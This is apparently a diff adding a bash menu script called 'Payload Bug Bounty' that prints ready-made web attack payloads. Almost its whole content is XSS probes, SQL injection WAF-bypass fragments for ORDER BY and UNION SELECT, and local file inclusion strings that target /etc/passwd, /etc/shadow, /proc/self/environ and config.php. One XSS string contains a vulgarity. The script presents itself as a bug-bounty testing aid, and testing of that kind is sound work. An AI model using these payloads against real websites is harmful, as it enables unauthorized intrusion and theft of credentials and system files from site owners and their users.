@@ -1,0 +1,88 @@
+figlet "Payload Bug Bounty"
+echo "============================="
+echo "Welcome To Payload Bug Bounty"
+echo "============================="
+echo "1) Payload Xss"
+echo "2) Payload Sql"
+echo "3) Payload Lfi"
+echo "4) Use of Tools?"
+echo "5) Exit"
+echo "============================="
+read -p "Select:" pil;
+if [ $pil = "1" ];
+  then
+  echo "=============================="
+  echo "Xss Payload"
+  echo "=============================="
+  echo "<script>alert(123);</script>"
+  echo "<script>alert(/XSS/)</script>"
+  echo "<ScRipT>prompt('Hello Xss');</ScRipT>"
+  echo "<marquee><script>alert('Kontol')</script></marquee>"
+  echo "'><script>alert('XSS')</script>"
+  echo "<scr<script>ipt>alert('XSS');</scr</script>ipt>"
+  echo "'>><marquee><h1>XSS</h1></marquee>"
+  echo "'><script>alert(0)</script>"
+  echo "=============================="
+  echo "Find Xss!"
+  elif [ $pil = "2" ];
+  then
+  echo "============"
+  echo "Order Bypass"
+  echo "============"
+  echo "/*!50000ORDER*/"
+  echo "/*!50000ORDER/**_**/*/"
+  echo "/*!50000GROUP/**_**/*/"
+  echo "%0AORDER%0ABY%0A100"
+  echo "+ORDER+BY+100+ASC"
+  echo "+AND+MOD(52,12)+/*!50000ORDER*/+BY+100"
+  echo "%23%0AORDER%23%0ABY%23%0A100"
+  echo "%0AORDER%0ABY%0A100"
+  echo "+AND+MOD(29,9)+/*!50000ORDER/**_**/*/+/*!50000BY/**_**/*/+100"
+  echo "============"
+  echo "Union Select Bypass"
+  echo "============"
+  echo "%23%0AuNION%23%0ASeLECT%23%0A"
+  echo "/*!50000UNION*/"
+  echo "/*!50000SELECT*/"
+  echo "/*!50000UNION/**_**/*/"
+  echo "/*!50000SELECT/**_**/*/"
+  echo "+AND+0+UNION+DISTINCT+SELECT"
+  echo "%55nion+%73elect"
+  echo "%75nion %73elect"
+  echo "+UniOn+distinctROW+SeLEct"
+  echo "+And .0union/**/distinctrow select/**/distinctrow"
+  echo "+UNION+ALL+SELECT"
+  echo "+or .0union/**/distinctrow select/**/distinctrow"
+  echo "/**8**/and/**8**/0/**8**/UniOn/**8**/sEleCT/**8**/"
+  echo "+UNunionION+SEselectLECT"
+  echo "+And .0union/**/distinctrow%23GearFourthBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB%0aselect/**/distinctrow"
+  echo "+or .0union/**/distinctrow%23GearFourthBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB%0aselect/**/distinctrow"
+  echo "============"
+  echo "Find Sql!"
+  elif [ $pil = "3" ];
+  then
+  echo "======================"
+  echo "Payload Lfi"
+  echo "======================"
+  echo "../../../../etc/passwd"
+  echo "/etc/passwd"
+  echo "/proc/version"
+  echo "/proc/self/environ"
+  echo "/etc/hosts"
+  echo "/etc/shadow"
+  echo "....//....//....//....//....//....//....//....//....//....//etc/passwd"
+  echo "..%5c..%5c..%5c..%5c..%5c..%5c..%5config.php%00"
+  echo "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+  echo "======================"
+  echo "Find Lfi!"
+  elif [ $pil = "4" ];
+  then
+  echo "This script is used to make it easier to find a suitable payload for testing website vulnerabilities"
+  elif [ $pil = "5" ];
+  then
+  echo "Good Bye"
+  fi
+  
+  
+  
+
